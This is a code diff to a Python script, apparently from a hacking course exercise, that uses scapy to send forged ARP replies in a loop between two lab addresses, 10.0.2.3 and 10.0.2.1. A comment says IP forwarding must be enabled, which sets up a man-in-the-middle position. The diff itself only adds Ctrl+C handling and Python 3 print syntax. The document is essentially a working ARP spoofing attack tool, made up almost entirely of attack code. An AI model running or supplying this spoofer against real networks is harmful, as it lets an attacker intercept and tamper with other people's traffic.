@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 import scapy.all as scapy
 import time
-import sys
+# import sys
 
 scapy.ls(scapy.ARP) #in terminal
 #pdst is the ip of the target computer
@@ -28,12 +28,15 @@ def spoof(target_ip, spoof_ip):
 
 
 sent_packets_count = 0
-while True:
-    spoof("10.0.2.3", "10.0.2.1")
-    spoof("10.0.2.1", "10.0.2.3")
-    sent_packets_count = sent_packets_count + 2
-    print("\r[+] Packets sent" + str(sent_packets_count)),
-    sys.stdout.flush()
-    time.sleep(2)
+try:
+    while True:
+        spoof("10.0.2.3", "10.0.2.1")
+        spoof("10.0.2.1", "10.0.2.3")
+        sent_packets_count = sent_packets_count + 2
+        print("\r[+] Packets sent:" + str(sent_packets_count), end="")
+        #sys.stdout.flush() #for python2
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("[+] Detected CTRL + C ..... Quitting")
 
 # terminal will require > echo 1 > /proc/sys/net/ipv4/ip_forward
